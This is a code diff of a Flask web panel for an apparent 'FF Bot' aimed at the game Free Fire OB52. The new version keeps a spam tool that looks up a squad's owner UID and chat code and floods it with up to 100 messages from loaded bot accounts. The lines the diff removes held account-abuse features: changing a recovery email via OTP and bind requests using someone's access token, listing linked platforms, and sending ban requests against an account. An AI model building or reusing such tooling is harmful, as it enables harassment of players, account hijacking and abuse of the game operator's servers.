+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255,61,113,0.25);
+        }
+        .btn-full { width: 100%; padding: 13px; margin-top: 12px; }
+
+        /* ─── SQUAD INFO BOX ─── */
+        .squad-box {
+            background: var(--bg);
+            border: 1px solid rgba(0,229,255,0.2);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 14px;
+            display: none;
+        }
+        .squad-box h4 {
+            font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+            color: var(--green); margin-bottom: 10px;
+        }
+        .squad-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 5px 0;
+            border-bottom: 1px solid var(--muted2);
+            font-size: 11px;
+        }
+        .squad-row:last-child { border-bottom: none; }
+        .squad-row .key { color: var(--muted); }
+        .squad-row .val {
+            background: var(--muted2);
+            padding: 2px 8px; border-radius: 4px;
+            color: var(--text);
+            font-size: 10px;
+        }
+
+        /* ─── PROGRESS ─── */
+        .progress-wrap { margin-top: 14px; display: none; }
         .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
+            height: 4px;
+            background: var(--muted2);
             border-radius: 10px;
             overflow: hidden;
+            margin: 8px 0;
         }
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #ff6b6b, #4ecdc4);
-            border-radius: 10px;
-            transition: width 0.3s ease;
             width: 0%;
-        }
-        .client-list { max-height: 300px; overflow-y: auto; }
-        .client-item {
-            padding: 12px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .client-id { color: white; font-weight: 500; }
-        .status-badge {
-            padding: 4px 8px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-        }
-        .status-connected { background: rgba(78, 205, 196, 0.2); color: #4ecdc4; }
-        .status-error { background: rgba(255, 107, 107, 0.2); color: #ff6b6b; }
-        .status-logging { background: rgba(255, 193, 7, 0.2); color: #ffc107; }
-        .alert {
-            padding: 15px;
+            background: linear-gradient(90deg, var(--accent), var(--green));
             border-radius: 10px;
-            margin-bottom: 20px;
+            transition: width 0.4s ease;
         }
-        .alert-success { background: rgba(78, 205, 196, 0.2); border: 1px solid #4ecdc4; color: #4ecdc4; }
-        .alert-error { background: rgba(255, 107, 107, 0.2); border: 1px solid #ff6b6b; color: #ff6b6b; }
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
-        @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } .container { padding: 20px; } }
-        .loading { text-align: center; padding: 20px; color: rgba(255,255,255,0.6); }
-        .sub-tabs { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
-        .sub-tab {
-            padding: 8px 16px;
-            background: rgba(255,255,255,0.07);
+        .progress-text { font-size: 10px; color: var(--muted); text-align: center; }
+
+        /* ─── CLIENT LIST ─── */
+        .client-list { max-height: 260px; overflow-y: auto; }
+        .client-list::-webkit-scrollbar { width: 4px; }
+        .client-list::-webkit-scrollbar-track { background: transparent; }
+        .client-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+        .client-item {
+            padding: 12px 0;
+            border-bottom: 1px solid var(--muted2);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .client-item:last-child { border-bottom: none; }
+        .client-id { font-size: 12px; color: var(--text); }
+        .client-meta { font-size: 10px; color: var(--muted); margin-top: 2px; }
+
+        .badge {
+            font-size: 10px; font-weight: 600;
+            padding: 3px 9px; border-radius: 20px;
+            letter-spacing: 0.5px;
+        }
+        .badge-connected { background: rgba(0,224,150,0.15); color: var(--green); }
+        .badge-error { background: rgba(255,61,113,0.15); color: var(--accent2); }
+        .badge-logging { background: rgba(255,170,0,0.15); color: var(--yellow); }
+        .badge-connecting { background: rgba(0,229,255,0.1); color: var(--accent); }
+        .badge-initializing { background: rgba(74,85,104,0.3); color: var(--muted); }
+
+        /* ─── ALERTS ─── */
+        #alertContainer { margin-bottom: 16px; }
+        .alert {
+            padding: 11px 14px;
             border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            color: rgba(255,255,255,0.6);
-            font-size: 13px;
-            font-weight: 500;
-            border: 1px solid rgba(255,255,255,0.08);
+            font-size: 11px;
+            margin-bottom: 8px;
+            animation: slideIn 0.2s ease;
         }
-        .sub-tab:hover { background: rgba(255,255,255,0.12); color: white; }
-        .sub-tab.active {
-            background: linear-gradient(135deg, rgba(255,107,107,0.3), rgba(78,205,196,0.3));
-            border-color: rgba(78,205,196,0.5);
-            color: white;
+        @keyframes slideIn {
+            from { transform: translateY(-8px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
-        .sub-tab-content { display: none; }
-        .sub-tab-content.active { display: block; }
+        .alert-success { background: rgba(0,224,150,0.1); border: 1px solid rgba(0,224,150,0.3); color: var(--green); }
+        .alert-error { background: rgba(255,61,113,0.1); border: 1px solid rgba(255,61,113,0.3); color: var(--accent2); }
+        .alert-info { background: rgba(0,229,255,0.08); border: 1px solid rgba(0,229,255,0.2); color: var(--accent); }
+
+        .empty-state { text-align: center; padding: 30px 20px; color: var(--muted); font-size: 11px; }
     </style>
 </head>
 <body>
+    <div class="bg-grid"></div>
+
     <nav class="navbar">
-        <div class="logo">🎮 FF Bot | Free Fire OB52</div>
-        <a href="/logout" class="logout-btn">Logout →</a>
+        <div class="nav-brand">
+            <div class="nav-icon">🎮</div>
+            <span class="nav-title">FF BOT</span>
+            <span class="nav-badge">OB52</span>
+        </div>
+        <div class="nav-right">
+            <div class="online-pill">
+                <div class="online-dot"></div>
+                <span id="onlineCount">0</span>&nbsp;ONLINE
+            </div>
+            <a href="/logout" class="logout-link">LOGOUT →</a>
+        </div>
     </nav>
-    
-    <div class="container">
+
+    <div class="page">
         <div id="alertContainer"></div>
-        
+
         <div class="stats-grid">
-            <div class="stat-card"><div class="stat-title">Connected Clients</div><div class="stat-value" id="totalClients">0</div></div>
-            <div class="stat-card"><div class="stat-title">Spam Accounts</div><div class="stat-value" id="spamAccounts">0</div></div>
-            <div class="stat-card"><div class="stat-title">Max Spam Count</div><div class="stat-value">100</div></div>
-            <div class="stat-card"><div class="stat-title">Game Version</div><div class="stat-value">OB52</div></div>
-        </div>
-        
-        <div class="tabs">
-            <div class="tab active" data-tab="spam">🎯 Spam Tool</div>
-            <div class="tab" data-tab="account">👤 Account Tools</div>
-            <div class="tab" data-tab="clients">📡 Connected Clients</div>
-        </div>
-        
-        <!-- Tab 1: Spam Tool -->
-        <div id="tab-spam" class="tab-content active">
-            <div class="card">
-                <div class="card-header">🎯 Spam Tool</div>
-                <div class="card-body">
-                    <div class="form-group"><label>Team Code</label><input type="text" id="teamcode" placeholder="Enter team code..."></div>
-                    <div class="form-group"><label>Message</label><textarea id="message" rows="3" placeholder="Enter spam message..."></textarea></div>
-                    <div class="form-row">
-                        <div class="form-group" style="margin-bottom:0;"><label>Spam Count (max 100)</label><input type="number" id="count" value="50" min="1" max="100"></div>
-                        <button id="getSquadBtn" class="btn-secondary">Get Squad Info</button>
-                    </div>
-                    <div id="squadInfo" class="squad-info" style="display:none;"></div>
-                    <div class="progress-section" id="progressSection" style="display:none;">
-                        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-                        <div class="progress-text" id="progressText" style="color:rgba(255,255,255,0.6);font-size:12px;text-align:center;margin-top:5px;">Spamming...</div>
-                    </div>
-                    <button id="spamBtn" style="width:100%; margin-top:20px;" disabled>Start Spam</button>
-                </div>
+            <div class="stat-card cyan">
+                <div class="stat-label">Connected Clients</div>
+                <div class="stat-val" id="totalClients">0</div>
+                <div class="stat-sub">Game server sockets</div>
+            </div>
+            <div class="stat-card green">
+                <div class="stat-label">Users Online</div>
+                <div class="stat-val" id="onlineStat">0</div>
+                <div class="stat-sub">Active right now</div>
+            </div>
+            <div class="stat-card yellow">
+                <div class="stat-label">Spam Accounts</div>
+                <div class="stat-val" id="spamAccounts">0</div>
+                <div class="stat-sub">Loaded bots</div>
+            </div>
+            <div class="stat-card red">
+                <div class="stat-label">Max Spam</div>
+                <div class="stat-val">100</div>
+                <div class="stat-sub">Messages per run</div>
             </div>
         </div>
-        
-        <!-- Tab 2: Account Tools (Recovery Email + Linked Platforms + Ban Account) -->
-        <div id="tab-account" class="tab-content">
-            <div class="sub-tabs">
-                <div class="sub-tab active" data-subtab="recovery">📧 Recovery Email</div>
-                <div class="sub-tab" data-subtab="linked">🔗 Linked Platforms</div>
-                <div class="sub-tab" data-subtab="ban">⚠️ Ban Account</div>
-            </div>
 
-            <div id="subtab-recovery" class="sub-tab-content active">
-                <div class="card">
-                    <div class="card-header">📧 Recovery Email Manager</div>
-                    <div class="card-body">
-                        <div class="form-group"><label>Access Token</label><input type="text" id="recToken" placeholder="Enter access token..."></div>
-                        <div class="form-group"><label>Email</label><input type="email" id="recEmail" placeholder="Enter email..."></div>
-                        <button id="getRecoveryInfoBtn" class="btn-secondary" style="width:100%; margin-bottom:10px;">Get Recovery Info</button>
-                        <div id="recoveryInfo" class="result-box" style="display:none;"></div>
-                        <div class="form-row" style="margin-top:20px;">
-                            <button id="sendOtpBtn" style="flex:1;">Send OTP</button>
-                            <button id="cancelRecoveryBtn" class="btn-secondary" style="flex:1;">Cancel Request</button>
+        <div class="main-grid">
+            <!-- Spam Tool -->
+            <div class="card">
+                <div class="card-head">
+                    <div class="card-head-icon icon-cyan">🎯</div>
+                    <span class="card-title">SPAM TOOL</span>
+                </div>
+                <div class="card-body">
+                    <div class="field">
+                        <label>Team Code</label>
+                        <input type="text" id="teamcode" placeholder="Enter team code...">
+                    </div>
+                    <div class="field">
+                        <label>Message</label>
+                        <textarea id="message" rows="3" placeholder="Enter spam message..."></textarea>
+                    </div>
+                    <div class="field-row">
+                        <div class="field" style="margin-bottom:0">
+                            <label>Spam Count (max 100)</label>
+                            <input type="number" id="count" value="50" min="1" max="100">
                         </div>
-                        <div class="form-group" style="margin-top:15px;"><label>OTP Code</label><input type="text" id="otpCode" placeholder="Enter OTP..."></div>
-                        <button id="verifyOtpBtn" style="width:100%; margin-bottom:10px;">Verify OTP</button>
-                        <div id="verifierResult" class="result-box" style="display:none;"></div>
-                        <button id="createBindBtn" style="width:100%; margin-top:10px;" disabled>Create Bind Request</button>
+                        <button class="btn btn-ghost" id="getSquadBtn">Get Info</button>
                     </div>
+
+                    <div class="squad-box" id="squadInfo">
+                        <h4>✓ Squad Found</h4>
+                        <div class="squad-row">
+                            <span class="key">Owner UID</span>
+                            <span class="val" id="s_owner">—</span>
+                        </div>
+                        <div class="squad-row">
+                            <span class="key">Chat Code</span>
+                            <span class="val" id="s_chat">—</span>
+                        </div>
+                        <div class="squad-row">
+                            <span class="key">Squad Code</span>
+                            <span class="val" id="s_squad">—</span>
+                        </div>
+                    </div>
+
+                    <div class="progress-wrap" id="progressWrap">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progressFill"></div>
+                        </div>
+                        <div class="progress-text" id="progressText">Starting...</div>
+                    </div>
+
+                    <button class="btn btn-red btn-full" id="spamBtn" disabled>⚡ START SPAM</button>
                 </div>
             </div>
 
-            <div id="subtab-linked" class="sub-tab-content">
-                <div class="card">
-                    <div class="card-header">🔗 Linked Platforms</div>
-                    <div class="card-body">
-                        <div class="form-group"><label>Access Token</label><input type="text" id="linkedToken" placeholder="Enter access token..."></div>
-                        <button id="getLinkedBtn" style="width:100%;">Get Linked Platforms</button>
-                        <div id="linkedResult" class="result-box" style="display:none; margin-top:15px;"></div>
-                    </div>
-                </div>
-            </div>
-
-            <div id="subtab-ban" class="sub-tab-content">
-                <div class="card">
-                    <div class="card-header">⚠️ Ban Account</div>
-                    <div class="card-body">
-                        <div class="form-group"><label>Access Token</label><input type="text" id="banToken" placeholder="Enter access token..."></div>
-                        <button id="banAccountBtn" style="width:100%; background: linear-gradient(135deg, #ff6b6b, #ff4444);">Ban Account</button>
-                        <div id="banResult" class="result-box" style="display:none; margin-top:15px;"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Tab 3: Connected Clients -->
-        <div id="tab-clients" class="tab-content">
+            <!-- Connected Clients -->
             <div class="card">
-                <div class="card-header">📡 Connected Clients</div>
+                <div class="card-head">
+                    <div class="card-head-icon icon-green">📡</div>
+                    <span class="card-title">CONNECTED CLIENTS</span>
+                </div>
                 <div class="card-body">
-                    <div class="client-list" id="clientList"><div class="loading">Loading...</div></div>
+                    <div class="client-list" id="clientList">
+                        <div class="empty-state">Loading...</div>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-    
-    <script>
-        let verifierToken = null;
-        
-        function showAlert(message, type) {
-            const container = document.getElementById('alertContainer');
-            const alert = document.createElement('div');
-            alert.className = `alert alert-${type}`;
-            alert.innerHTML = message;
-            container.appendChild(alert);
-            setTimeout(() => alert.remove(), 5000);
-        }
-        
-        document.querySelectorAll('.tab').forEach(tab => {
-            tab.addEventListener('click', () => {
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                tab.classList.add('active');
-                document.getElementById(`tab-${tab.dataset.tab}`).classList.add('active');
-            });
-        });
 
-        document.querySelectorAll('.sub-tab').forEach(stab => {
-            stab.addEventListener('click', () => {
-                document.querySelectorAll('.sub-tab').forEach(t => t.classList.remove('active'));
-                document.querySelectorAll('.sub-tab-content').forEach(c => c.classList.remove('active'));
-                stab.classList.add('active');
-                document.getElementById(`subtab-${stab.dataset.subtab}`).classList.add('active');
-            });
-        });
-        
+    <script>
+        function showAlert(msg, type) {
+            const c = document.getElementById('alertContainer');
+            const el = document.createElement('div');
+            el.className = `alert alert-${type}`;
+            el.textContent = msg;
+            c.appendChild(el);
+            setTimeout(() => el.remove(), 4000);
+        }
+
         async function loadStatus() {
             try {
-                const response = await fetch('/api/status');
-                const data = await response.json();
+                const res = await fetch('/api/status');
+                const data = await res.json();
                 document.getElementById('totalClients').textContent = data.total_clients;
                 document.getElementById('spamAccounts').textContent = data.spam_accounts.length;
-                const clientList = document.getElementById('clientList');
+                const online = data.online_users || 0;
+                document.getElementById('onlineCount').textContent = online;
+                document.getElementById('onlineStat').textContent = online;
+
+                const list = document.getElementById('clientList');
                 if (data.total_clients === 0) {
-                    clientList.innerHTML = '<div class="loading">No connected clients</div>';
+                    list.innerHTML = '<div class="empty-state">No connected clients</div>';
                 } else {
-                    clientList.innerHTML = '';
-                    for (const [uid, client] of Object.entries(data.clients)) {
+                    list.innerHTML = '';
+                    for (const [uid, c] of Object.entries(data.clients)) {
                         const div = document.createElement('div');
                         div.className = 'client-item';
-                        div.innerHTML = `<span class="client-id">${client.id}</span><span class="status-badge status-${client.status}">${client.status}</span>`;
-                        clientList.appendChild(div);
+                        div.innerHTML = `
+                            <div>
+                                <div class="client-id">${c.id}</div>
+                                <div class="client-meta">${c.message || '—'}</div>
+                            </div>
+                            <span class="badge badge-${c.status}">${c.status.toUpperCase()}</span>
+                        `;
+                        list.appendChild(div);
                     }
                 }
             } catch(e) { console.error(e); }
         }
-        
+
+        async function sendHeartbeat() {
+            try { await fetch('/api/heartbeat', { method: 'POST' }); } catch(e) {}
+        }
+
         async function getSquadInfo() {
             const teamcode = document.getElementById('teamcode').value.trim();
-            if (!teamcode) { showAlert('Enter team code', 'error'); return; }
+            if (!teamcode) { showAlert('Please enter team code', 'error'); return; }
             const btn = document.getElementById('getSquadBtn');
-            btn.disabled = true; btn.textContent = 'Loading...';
+            btn.disabled = true; btn.textContent = '...';
             try {
-                const response = await fetch('/api/get_squad', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ teamcode }) });
-                const data = await response.json();
+                const res = await fetch('/api/get_squad', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ teamcode })
+                });
+                const data = await res.json();
                 if (data.success) {
+                    document.getElementById('s_owner').textContent = data.OwNer_UiD || '—';
+                    document.getElementById('s_chat').textContent = data.ChaT_CoDe || '—';
+                    document.getElementById('s_squad').textContent = data.SQuAD_CoDe || 'N/A';
                     document.getElementById('squadInfo').style.display = 'block';
-                    document.getElementById('squadInfo').innerHTML = `<h4>✅ Squad Found!</h4><p><strong>Owner UID:</strong> <code>${data.OwNer_UiD}</code></p><p><strong>Chat Code:</strong> <code>${data.ChaT_CoDe}</code></p>`;
                     document.getElementById('spamBtn').disabled = false;
                     showAlert('Squad info retrieved!', 'success');
-                } else { showAlert(`Failed: ${data.reason || data.error}`, 'error'); }
-            } catch(e) { showAlert('Failed to get squad info', 'error'); }
-            finally { btn.disabled = false; btn.textContent = 'Get Squad Info'; }
+                } else {
+                    showAlert(`Failed: ${data.reason || 'Unknown error'}`, 'error');
+                    document.getElementById('spamBtn').disabled = true;
+                }
+            } catch(e) {
+                showAlert('Failed to get squad info', 'error');
+            } finally {
+                btn.disabled = false; btn.textContent = 'Get Info';
+            }
         }
-        
+
         async function startSpam() {
             const teamcode = document.getElementById('teamcode').value.trim();
             const message = document.getElementById('message').value.trim();
             const count = parseInt(document.getElementById('count').value);
-            if (!teamcode || !message) { showAlert('Fill all fields', 'error'); return; }
-            const spamBtn = document.getElementById('spamBtn');
-            spamBtn.disabled = true; spamBtn.textContent = 'Spamming...';
-            const progressSection = document.getElementById('progressSection');
-            progressSection.style.display = 'block';
-            document.getElementById('progressFill').style.width = '0%';
-            document.getElementById('progressText').textContent = 'Starting spam...';
+            if (!teamcode || !message) { showAlert('Please fill all fields', 'error'); return; }
+
+            const btn = document.getElementById('spamBtn');
+            btn.disabled = true; btn.textContent = 'SPAMMING...';
+            const pw = document.getElementById('progressWrap');
+            const pf = document.getElementById('progressFill');
+            const pt = document.getElementById('progressText');
+            pw.style.display = 'block'; pf.style.width = '0%'; pt.textContent = 'Starting spam...';
+
+            // Fake progress animation while waiting
+            let fakeP = 0;
+            const ticker = setInterval(() => {
+                fakeP = Math.min(fakeP + 2, 85);
+                pf.style.width = fakeP + '%';
+            }, 300);
+
             try {
-                const response = await fetch('/api/spam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ teamcode, message, count }) });
-                const data = await response.json();
+                const res = await fetch('/api/spam', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ teamcode, message, count })
+                });
+                const data = await res.json();
+                clearInterval(ticker);
                 if (data.success) {
-                    document.getElementById('progressFill').style.width = '100%';
-                    document.getElementById('progressText').textContent = `✅ Completed! Sent ${data.spam_count} messages.`;
-                    showAlert(`Spam completed! Sent ${data.spam_count} messages.`, 'success');
+                    pf.style.width = '100%';
+                    pt.textContent = `✓ Sent ${data.spam_count} messages to ${data.squad_info?.OwNer_UiD || teamcode}`;
+                    showAlert(`Spam completed! ${data.spam_count} messages sent.`, 'success');
                 } else {
-                    document.getElementById('progressText').textContent = `❌ Failed: ${data.error}`;
-                    showAlert(`Failed: ${data.error}`, 'error');
+                    pf.style.width = '0%';
+                    pt.textContent = `✗ Failed: ${data.error || 'Unknown error'}`;
+                    showAlert(`Spam failed: ${data.error || 'Unknown error'}`, 'error');
                 }
-            } catch(e) { showAlert('Failed to start spam', 'error'); }
-            finally {
-                spamBtn.disabled = false; spamBtn.textContent = 'Start Spam';
-                setTimeout(() => { progressSection.style.display = 'none'; }, 3000);
+            } catch(e) {
+                clearInterval(ticker);
+                pf.style.width = '0%';
+                pt.textContent = '✗ Request failed';
+                showAlert('Failed to start spam', 'error');
+            } finally {
+                btn.disabled = false; btn.textContent = '⚡ START SPAM';
+                setTimeout(() => { pw.style.display = 'none'; }, 4000);
             }
         }
-        
-        async function getRecoveryInfo() {
-            const token = document.getElementById('recToken').value.trim();
-            if (!token) { showAlert('Enter access token', 'error'); return; }
-            const btn = event.target;
-            btn.disabled = true; btn.textContent = 'Loading...';
-            try {
-                const response = await fetch('/api/recovery/get_info', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ access_token: token }) });
-                const data = await response.json();
-                const infoDiv = document.getElementById('recoveryInfo');
-                if (data.success) {
-                    infoDiv.style.display = 'block';
-                    infoDiv.innerHTML = `<h4>📋 Recovery Info</h4><p>${data.status}</p>`;
-                } else { infoDiv.style.display = 'block'; infoDiv.innerHTML = `<h4>❌ Error</h4><p>${data.error}</p>`; }
-            } catch(e) { showAlert('Failed to get info', 'error'); }
-            finally { btn.disabled = false; btn.textContent = 'Get Recovery Info'; }
-        }
-        
-        async function sendOtp() {
-            const email = document.getElementById('recEmail').value.trim();
-            const token = document.getElementById('recToken').value.trim();
-            if (!email || !token) { showAlert('Enter email and token', 'error'); return; }
-            const btn = event.target;
-            btn.disabled = true; btn.textContent = 'Sending...';
-            try {
-                const response = await fetch('/api/recovery/send_otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, access_token: token }) });
-                const data = await response.json();
-                if (data.success) showAlert('OTP sent! Check your email.', 'success');
-                else showAlert(`Failed: ${data.error}`, 'error');
-            } catch(e) { showAlert('Failed to send OTP', 'error'); }
-            finally { btn.disabled = false; btn.textContent = 'Send OTP'; }
-        }
-        
-        async function verifyOtp() {
-            const otp = document.getElementById('otpCode').value.trim();
-            const email = document.getElementById('recEmail').value.trim();
-            const token = document.getElementById('recToken').value.trim();
-            if (!otp || !email || !token) { showAlert('Enter OTP, email and token', 'error'); return; }
-            const btn = event.target;
-            btn.disabled = true; btn.textContent = 'Verifying...';
-            try {
-                const response = await fetch('/api/recovery/verify_otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ otp, email, access_token: token }) });
-                const data = await response.json();
-                const resultDiv = document.getElementById('verifierResult');
-                if (data.success) {
-                    verifierToken = data.verifier_token;
-                    resultDiv.style.display = 'block';
-                    resultDiv.innerHTML = `<h4>✅ OTP Verified!</h4><p>Verifier Token: <code>${verifierToken.substring(0, 30)}...</code></p>`;
-                    document.getElementById('createBindBtn').disabled = false;
-                    showAlert('OTP verified!', 'success');
-                } else {
-                    resultDiv.style.display = 'block';
-                    resultDiv.innerHTML = `<h4>❌ Verification Failed</h4><p>${data.error}</p>`;
-                }
-            } catch(e) { showAlert('Failed to verify OTP', 'error'); }
-            finally { btn.disabled = false; btn.textContent = 'Verify OTP'; }
-        }
-        
-        async function createBind() {
-            if (!verifierToken) { showAlert('Verify OTP first', 'error'); return; }
-            const email = document.getElementById('recEmail').value.trim();
-            const token = document.getElementById('recToken').value.trim();
-            const btn = event.target;
-            btn.disabled = true; btn.textContent = 'Processing...';
-            try {
-                const response = await fetch('/api/recovery/create_bind', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verifier_token: verifierToken, access_token: token, email }) });
-                const data = await response.json();
-                if (data.success) { showAlert(data.message, 'success'); verifierToken = null; document.getElementById('createBindBtn').disabled = true; }
-                else showAlert(`Failed: ${data.error}`, 'error');
-            } catch(e) { showAlert('Failed to create bind', 'error'); }
-            finally { btn.disabled = false; btn.textContent = 'Create Bind Request'; }
-        }
-        
-        async function cancelRecovery() {
-            const token = document.getElementById('recToken').value.trim();
-            if (!token) { showAlert('Enter access token', 'error'); return; }
-            const btn = event.target;
-            btn.disabled = true; btn.textContent = 'Cancelling...';
-            try {
-                const response = await fetch('/api/recovery/cancel', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ access_token: token }) });
-                const data = await response.json();
-                if (data.success) showAlert('Request cancelled', 'success');
-                else showAlert(`Failed: ${data.error}`, 'error');
-            } catch(e) { showAlert('Failed to cancel', 'error'); }
-            finally { btn.disabled = false; btn.textContent = 'Cancel Request'; }
-        }
-        
-        async function getLinkedPlatforms() {
-            const token = document.getElementById('linkedToken').value.trim();
-            if (!token) { showAlert('Enter access token', 'error'); return; }
-            const btn = event.target;
-            btn.disabled = true; btn.textContent = 'Loading...';
-            try {
-                const response = await fetch('/api/account/linked_platforms', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ access_token: token }) });
-                const data = await response.json();
-                const resultDiv = document.getElementById('linkedResult');
-                if (data.success) {
-                    let html = `<h4>🔗 Linked Platforms</h4><p><strong>Main Platform:</strong> ${data.main_platform || 'N/A'}</p>`;
-                    if (data.platforms.length > 0) {
-                        html += '<p><strong>Linked Accounts:</strong></p>';
-                        data.platforms.forEach(p => { html += `<p>• ${p.platform}: ${p.email || p.nickname || 'N/A'}</p>`; });
-                    } else html += '<p>No linked platforms found.</p>';
-                    resultDiv.style.display = 'block';
-                    resultDiv.innerHTML = html;
-                } else { resultDiv.style.display = 'block'; resultDiv.innerHTML = `<h4>❌ Error</h4><p>${data.error}</p>`; }
-            } catch(e) { showAlert('Failed to get platforms', 'error'); }
-            finally { btn.disabled = false; btn.textContent = 'Get Linked Platforms'; }
-        }
-        
-        async function banAccount() {
-            const token = document.getElementById('banToken').value.trim();
-            if (!token) { showAlert('Enter access token', 'error'); return; }
-            if (!confirm('⚠️ WARNING: This will attempt to ban the account! Are you sure?')) return;
-            const btn = event.target;
-            btn.disabled = true; btn.textContent = 'Processing...';
-            try {
-                const response = await fetch('/api/account/ban', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ access_token: token }) });
-                const data = await response.json();
-                const resultDiv = document.getElementById('banResult');
-                if (data.success) {
-                    resultDiv.style.display = 'block';
-                    resultDiv.innerHTML = `<h4>⚠️ Ban Request Sent</h4><p>Account ID: ${data.account_id}<br>Platform: ${data.platform}</p>`;
-                    showAlert('Ban request sent!', 'success');
-                } else { resultDiv.style.display = 'block'; resultDiv.innerHTML = `<h4>❌ Failed</h4><p>${data.error}</p>`; }
-            } catch(e) { showAlert('Failed to process ban', 'error'); }
-            finally { btn.disabled = false; btn.textContent = 'Ban Account'; }
-        }
-        
+
         document.getElementById('getSquadBtn').addEventListener('click', getSquadInfo);
         document.getElementById('spamBtn').addEventListener('click', startSpam);
-        document.getElementById('getRecoveryInfoBtn').addEventListener('click', getRecoveryInfo);
-        document.getElementById('sendOtpBtn').addEventListener('click', sendOtp);
-        document.getElementById('verifyOtpBtn').addEventListener('click', verifyOtp);
-        document.getElementById('createBindBtn').addEventListener('click', createBind);
-        document.getElementById('cancelRecoveryBtn').addEventListener('click', cancelRecovery);
-        document.getElementById('getLinkedBtn').addEventListener('click', getLinkedPlatforms);
-        document.getElementById('banAccountBtn').addEventListener('click', banAccount);
-        
+
         loadStatus();
-        setInterval(loadStatus, 10000);
+        setInterval(loadStatus, 5000);
+        sendHeartbeat();
+        setInterval(sendHeartbeat, 15000);
     </script>
 </body>
 </html>''')
@@ -1814,19 +1477,14 @@ def create_templates():
 # ==================== MAIN ====================
 if __name__ == "__main__":
     create_templates()
-    print("[FF_BOT] Starting...", flush=True)
+    info("=" * 50)
+    info("🤖 Web Bot đang khởi động...")
+    info(f"📁 Log file: {LOG_FILE}")
+    info(f"🌐 Web interface: http://localhost:5000")
+    info(f"🔐 Default login: {ADMIN_USERNAME} / {ADMIN_PASSWORD}")
+    info("=" * 50)
     
-    # Start spam server in background
-    spam_thread = threading.Thread(target=start_spam_server, daemon=True)
-    spam_thread.start()
+    threading.Thread(target=start_spam_server, daemon=True).start()
+    threading.Thread(target=cleanup_online_users, daemon=True).start()
     
-    # Run Flask - dung Werkzeug voi log tat hoat toan
-    try:
-        import logging as _log
-        _log.getLogger("werkzeug").disabled = True
-        app.logger.disabled = True
-        app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)),
-                debug=False, threaded=True, use_reloader=False)
-    except Exception as e:
-        err(f"Failed to start server: {e}")
-        sys.exit(1)
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
